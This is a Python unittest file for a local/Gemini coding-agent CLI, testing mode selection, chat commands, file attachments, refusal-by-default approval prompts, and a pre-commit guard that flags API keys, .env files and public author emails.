            return cli.choose_mode(replace(Config(), gemini_api_key=key, fallback_backend=fallback),
                                   mode)

    def test_each_mode_chooses_its_models(self):
        config, notes = self.choose("online", key="k", local="local")
        self.assertEqual((config.backend, config.fallback_backend), ("gemini", ""))
        config, notes = self.choose("auto", key="k", local="local")
        self.assertEqual((config.backend, config.fallback_backend), ("gemini", "local"))
        self.assertTrue(any("offline backup: a local model" in n for n in notes))
        config, _ = self.choose("auto", key="k", local="ollama")
        self.assertEqual(config.fallback_backend, "ollama")
        config, notes = self.choose("auto", local="openai")
        self.assertEqual((config.backend, config.num_ctx), ("local", 8192))
        self.assertIn("no GEMINI_API_KEY", notes[0])
        config, _ = self.choose("offline", key="k", local="local")
        self.assertEqual((config.backend, config.mode), ("local", "offline"))

    def test_impossible_modes_say_what_to_do(self):
        with self.assertRaisesRegex(ValueError, "online mode needs a Gemini key"):
            self.choose("online")
        with self.assertRaisesRegex(ValueError, "No local model"):
            self.choose("offline", key="k")
        with self.assertRaisesRegex(ValueError, "No model is available yet"):
            self.choose("auto")
        with self.assertRaisesRegex(ValueError, "unknown mode"):
            self.choose("sometimes", key="k")

    def test_backends_for_the_modes(self):
        self.assertIsInstance(make_backend(replace(Config(), backend="local")), LocalModel)
        chain = make_gemini(replace(Config(), gemini_api_key="k", gemini_models=("m1",),
                                    gemini_strong_models=(), fallback_backend="local"))
        last = chain._entries[-1]
        self.assertEqual(last.name, "local")
        self.assertIsInstance(last.backend, LocalModel)
        self.assertIsNotNone(chain._probe)
        with mock.patch.object(cli, "find_model_file", return_value=Path("Qwen3-8B.gguf")):
            self.assertEqual(cli.model_label(replace(Config(), backend="local")), "local:Qwen3-8B")
            self.assertTrue(cli.model_label(replace(Config(), backend="gemini", gemini_models=("m",),
                            gemini_strong_models=(), fallback_backend="local")).endswith("> local:Qwen3-8B"))

    def test_flags(self):
        parser = cli.build_parser()
        self.assertEqual(parser.parse_args(["--offline"]).mode, "offline")
        self.assertEqual(parser.parse_args(["--online"]).mode, "online")
        self.assertEqual(parser.parse_args(["--mode", "auto"]).mode, "auto")
        self.assertEqual(parser.parse_args(["-p", "hi"]).prompt, "hi")
        self.assertTrue(parser.parse_args(["-c"]).resume)
        with contextlib.redirect_stdout(io.StringIO()) as out, self.assertRaises(SystemExit):
            parser.parse_args(["--version"])
        self.assertIn("localagent 0.", out.getvalue())


class ChatTests(unittest.TestCase):
    def chat(self, tmp, script, **kw):
        cfg = replace(Config(), workspace=Path(tmp), auto_format=False, **kw)
        tools = ToolBox(cfg, lambda _q: True, {"permissions": {"allow": ["run_tests"], "deny": []}})
        args = cli.build_parser().parse_args([])
        with contextlib.redirect_stdout(io.StringIO()):
            return cli.Chat(cfg, args, FakeBackend(script), tools, Meter())

    def say(self, chat, text) -> str:
        with contextlib.redirect_stdout(io.StringIO()) as out:
            self.assertTrue(chat.command(text))
        return out.getvalue()

    def test_bang_runs_a_command_and_its_output_goes_with_the_next_request(self):
        with tempfile.TemporaryDirectory() as tmp:
            chat = self.chat(tmp, [{"role": "assistant", "content": "seen"}])
            self.assertIn("hello-from-shell", self.say(chat, "!echo hello-from-shell"))
            self.assertEqual(chat.meter.calls, 0)                   # no model call
            self.say(chat, "what did it print?")
            sent = [m["content"] for m in chat.agent.messages if m["role"] == "user"][-1]
            self.assertIn("hello-from-shell", sent)
            self.assertIn("My request: what did it print?", sent)

    def test_hash_saves_a_note_and_at_attaches_a_file(self):
        with tempfile.TemporaryDirectory() as tmp:
            (Path(tmp) / "AGENT.md").write_text("# Notes for agents\n\n## Notes\n- old\n\n## Other\nx\n",
                                                encoding="utf-8")
            (Path(tmp) / "app.py").write_text("print('APP')\n", encoding="utf-8")
            chat = self.chat(tmp, [{"role": "assistant", "content": "ok"}])
            self.say(chat, "# always use type hints")
            notes = (Path(tmp) / "AGENT.md").read_text(encoding="utf-8")
            self.assertIn("- old\n- always use type hints\n\n## Other", notes)
            self.assertIn("always use type hints", chat.agent.messages[0]["content"])   # reloaded
            self.assertIn("[attached: app.py]", self.say(chat, "explain @app.py, mail me@example.com"))
            self.assertIn("print('APP')", chat.agent.messages[-2]["content"])

    def test_attachments_respect_the_size_limit(self):
        with tempfile.TemporaryDirectory() as tmp:
            (Path(tmp) / "big.txt").write_text("b" * 500, encoding="utf-8")
            text, attached = cli.attach_files("see @big.txt and @missing.py", Path(tmp), 100)
            self.assertEqual((text, attached), ("see @big.txt and @missing.py", []))
            text, attached = cli.attach_files("see @big.txt.", Path(tmp), 1000)
            self.assertEqual(attached, ["big.txt"])

    def test_model_status_and_switching(self):
        with tempfile.TemporaryDirectory() as tmp:
            chat = self.chat(tmp, [])
            with mock.patch.object(cli, "describe_local", return_value="LOCAL THING"):
                status = self.say(chat, "/model")
            self.assertIn("mode: auto", status)
            self.assertIn("offline: LOCAL THING", status)
            offline = replace(chat.config, backend="local", mode="offline", num_ctx=8192)
            new_backend = FakeBackend([])
            with mock.patch.object(cli, "choose_mode", return_value=(offline, ["note"])), \
                    mock.patch.object(cli, "make_backend", return_value=new_backend):
                said = self.say(chat, "/offline")
            self.assertIn("[now offline", said)
            self.assertIs(chat.agent.backend, new_backend)
            self.assertEqual(chat.config.mode, "offline")
            with mock.patch.object(cli, "choose_mode", side_effect=ValueError("no key")):
                self.assertIn("cannot switch to online: no key", self.say(chat, "/model online"))
            self.assertIs(chat.agent.backend, new_backend)          # unchanged after a failure

    def test_clear_resume_permissions_and_unknown_commands(self):
        with tempfile.TemporaryDirectory() as tmp:
            chat = self.chat(tmp, [{"role": "assistant", "content": "a"}])
            self.say(chat, "remember the blue door")
            self.assertIn("conversation cleared", self.say(chat, "/clear"))
            self.assertEqual(len(chat.agent.messages), 1)
            listing = self.say(chat, "/resume")
            self.assertIn("remember the blue door", listing)
            self.assertIn("(this conversation)", listing)
            self.assertIn("allow: run_tests", self.say(chat, "/permissions"))
            self.assertIn("unknown command /nope", self.say(chat, "/nope"))
            with contextlib.redirect_stdout(io.StringIO()):
                self.assertFalse(chat.command("/exit"))

    def test_print_mode_answers_once(self):
        with tempfile.TemporaryDirectory() as tmp:
            cfg = replace(Config(), workspace=Path(tmp))
            tools = ToolBox(cfg, cli.refuse)
            script = [tool_call("run_tests"), {"role": "assistant", "content": "the answer"}]
            with contextlib.redirect_stdout(io.StringIO()) as out, \
                    contextlib.redirect_stderr(io.StringIO()) as err:
                code = cli.run_once(cfg, FakeBackend(script), tools, Meter(), "question")
            self.assertEqual((code, out.getvalue().strip()), (0, "the answer"))
            self.assertIn("refused", err.getvalue())                # nobody to ask: refused

    def test_prompts_without_a_keyboard_mean_no(self):
        def gone(_prompt):
            raise EOFError
        self.assertFalse(cli.Approver(read=gone)("run x"))
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertFalse(cli.confirm("go? ", read=gone))

    def test_colours_only_where_wanted(self):
        with contextlib.redirect_stdout(io.StringIO()) as out:
            cli.make_printer(True)("     +added")
            cli.make_printer(False)("     -removed")
        self.assertEqual(out.getvalue(), "\033[32m     +added\033[0m\n     -removed\n")
        with mock.patch.dict(os.environ, {"NO_COLOR": "1"}):
            self.assertFalse(cli.use_color())

    def test_overview_summarises_crowded_folders(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            for i in range(30):
                (root / "bin").mkdir(exist_ok=True)
                (root / "bin" / f"lib{i}.dll").write_bytes(b"x")
            (root / "src").mkdir()
            for name in ("main.py", "util.py"):
                (root / "src" / name).write_text("x", encoding="utf-8")
            (root / "README.md").write_text("x", encoding="utf-8")
            tree = project_tree(root, 6).splitlines()
            self.assertEqual(tree, ["README.md", "bin/ (30 files: 30 .dll)", "src/main.py",
                                    "src/util.py"])


class CommitGuardTests(unittest.TestCase):
    def test_problems_in_staged_files(self):
        key = b"AIza" + b"x" * 35                                   # built here: never in the source
        self.assertEqual(check_commit.problems("ok.py", 10, lambda: b"print(1)"), [])
        self.assertIn("Google API key", check_commit.problems("cfg.py", 50, lambda: key)[0])
        self.assertIn("must never be committed", check_commit.problems(".env", 5, lambda: b"")[0])
        self.assertEqual(check_commit.problems(".env.example", 5, lambda: b"KEY="), [])
        big = check_commit.problems("models/m.gguf", 5_000_000_000, lambda: b"")
        self.assertEqual(len(big), 2)                               # a model file, and too big
        self.assertIn("too big", big[1])

    def test_only_a_private_author_address_passes(self):
        self.assertIsNone(check_commit.author_problem(
            "A <1+a@users.noreply.github.com> 1700000000 +0000"))
        self.assertIn("would be public", check_commit.author_problem("A <a@gmail.com> 1 +0000"))


if __name__ == "__main__":
    unittest.main()
